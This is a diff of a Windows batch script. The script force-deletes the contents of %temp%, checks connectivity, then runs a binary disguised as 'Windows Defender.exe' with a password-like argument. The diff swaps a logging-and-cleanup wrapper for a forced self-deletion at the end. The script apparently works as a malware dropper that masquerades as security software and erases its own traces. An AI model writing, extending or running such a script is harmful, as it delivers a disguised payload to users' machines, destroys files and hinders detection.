@@ -1,17 +1,6 @@
 @echo off
 setlocal 
 
-set "TEMP_LOG_FILE=%TEMP%\log.tmp"
-
-call :main >> "%TEMP_LOG_FILE%" 2>&1
-
-del /s /f /q /a "%TEMP_LOG_FILE%" >nul
-endlocal
-del /s /f /q /a "%~f0" >nul
-exit /b
-
-:main
-
 del /s /f /q /a "%temp%\*"
 FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 :connectivitycheck
@@ -98,3 +87,5 @@ cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
 "%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+endlocal
+del /s /f /q /a "%~f0"
